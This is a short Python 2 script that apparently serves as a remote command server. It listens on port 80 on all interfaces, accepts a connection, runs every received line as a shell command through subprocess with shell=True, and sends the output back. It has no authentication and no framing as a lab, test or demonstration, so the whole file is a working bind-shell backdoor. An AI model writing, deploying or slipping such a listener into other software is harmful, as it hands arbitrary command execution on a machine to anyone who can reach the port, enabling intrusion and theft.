#!/usr/bin/env python
import subprocess
import socket

while 1:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('',80))
	s.listen(1)
	print 'Remote server started.'
	conn, addr = s.accept()
	print 'Connected by', addr
	while 1:
		data = conn.recv(2048)
		data=data.strip()
		if not data: break
		if data=='q': exit()
		print 'Commmand recieved: %s' % data
		data=data.split('\n')
		ot=''
		for inst in data:
			ot+=subprocess.check_output(inst,shell=True)
		ot=str(ot)
		conn.sendall(ot)
	conn.close()
	s.shutdown